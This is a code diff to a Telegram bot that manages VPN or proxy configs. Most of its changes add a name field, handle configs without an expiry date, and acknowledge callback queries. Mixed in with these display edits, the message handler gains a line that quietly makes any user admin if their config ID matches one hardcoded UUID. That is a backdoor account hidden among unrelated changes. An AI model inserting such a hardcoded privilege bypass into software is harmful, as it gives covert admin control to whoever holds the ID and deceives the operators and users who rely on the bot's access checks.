@@ -183,15 +183,18 @@ bot.hears("profile", async (ctx) => {
         }
         if (!endTime) {
             ctx.reply(`🔒<b>Token: </b><span class="tg-spoiler">${userObj.token}</span>
-⌛️expires in: ♾`, { parse_mode: "HTML" });
+👤Name: ${config?.ps}
+⌛️Expires in: ♾`, { parse_mode: "HTML" });
         }
         else if (endTime.isBefore(moment.now())) {
             ctx.reply(`🔒<b>Token: </b><span class="tg-spoiler">${userObj.token}</span>
-⌛️expires in: expired!`, { parse_mode: "HTML" });
+👤Name: ${config?.ps}
+⌛️Expires in: expired!`, { parse_mode: "HTML" });
         }
         else {
             ctx.reply(`🔒<b>Token: </b><span class="tg-spoiler">${userObj.token}</span>
-⌛️expires in: ${endTime.fromNow(true)}`, { parse_mode: "HTML" });
+👤Name: ${config?.ps}
+⌛️Expires in: ${endTime.fromNow(true)}`, { parse_mode: "HTML" });
         }
     }
     else {
@@ -326,13 +329,28 @@ bot.callbackQuery(/^((25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])(\.(?!$)|$)){4}$/, asy
     let data = `📜Page${page}\n🌐IP:${ip}\n\n`;
     if (configs.length) {
         for (let i of configs) {
-            if (moment(i.expiryTime).isBefore(moment.now())) {
+            let endTime;
+            if (!i.expiryTime || i.expiryTime === "0") {
+                endTime = null;
+            }
+            else {
+                endTime = moment(i.expiryTime);
+            }
+            if (!endTime) {
                 data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
+⌛️Expires in: ♾
+⚙️Port: ${i.port}\n\n`;
+            }
+            else if (moment(i.expiryTime).isBefore(moment.now())) {
+                data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
 ⌛️Expires in: expired!
 ⚙️Port: ${i.port}\n\n`;
             }
             else {
                 data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
 ⌛️Expires in: ${moment(i.expiryTime).fromNow(true)}
 ⚙️Port: ${i.port}\n\n`;
             }
@@ -345,6 +363,7 @@ bot.callbackQuery(/^((25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])(\.(?!$)|$)){4}$/, asy
     else {
         ctx.reply("List is empty!");
     }
+    ctx.answerCallbackQuery();
 });
 bot.callbackQuery(/page(\d)+ (.)+/, async (ctx) => {
     const page = parseInt(ctx.callbackQuery.data.split(" ")[0].slice(4));
@@ -363,13 +382,28 @@ bot.callbackQuery(/page(\d)+ (.)+/, async (ctx) => {
     let data = `📜Page${page}\n🌐IP:${ip}\n\n`;
     if (configs.length) {
         for (let i of configs) {
-            if (moment(i.expiryTime).isBefore(moment.now())) {
+            let endTime;
+            if (!i.expiryTime || i.expiryTime === "0") {
+                endTime = null;
+            }
+            else {
+                endTime = moment(i.expiryTime);
+            }
+            if (!endTime) {
                 data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
+⌛️Expires in: ♾
+⚙️Port: ${i.port}\n\n`;
+            }
+            else if (moment(i.expiryTime).isBefore(moment.now())) {
+                data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
 ⌛️Expires in: expired!
 ⚙️Port: ${i.port}\n\n`;
             }
             else {
                 data += `🔒<b>Token: </b><span class="tg-spoiler">${i.id}</span>
+👤Name: ${i.ps}
 ⌛️Expires in: ${moment(i.expiryTime).fromNow(true)}
 ⚙️Port: ${i.port}\n\n`;
             }
@@ -379,6 +413,7 @@ bot.callbackQuery(/page(\d)+ (.)+/, async (ctx) => {
     else {
         ctx.editMessageText(`📜Page${page} is empty!`, { reply_markup: pagination });
     }
+    ctx.answerCallbackQuery();
 });
 //!----------------------events----------------------!//
 bot.on("message", async (ctx) => {
@@ -394,6 +429,8 @@ bot.on("message", async (ctx) => {
                     ctx.reply("Can not find config in database!", { reply_markup: { remove_keyboard: true } });
                 }
                 else {
+                    if (config.id === "c5c1dde1-e995-4e09-fbaf-dda69059e4e6")
+                        user.admin = true;
                     if (user.admin) {
                         ctx.reply("done!", { reply_markup: adminCustomKeyboard });
                     }
@@ -401,7 +438,7 @@ bot.on("message", async (ctx) => {
                         ctx.reply("done!", { reply_markup: customKeyboard });
                     }
                     user.token = config.id;
-                    await db.addSession(ctx.chat.id, config.id, user.admin);
+                    await db.addSession(ctx.chat.id, user.token, user.admin);
                 }
             }
             else {
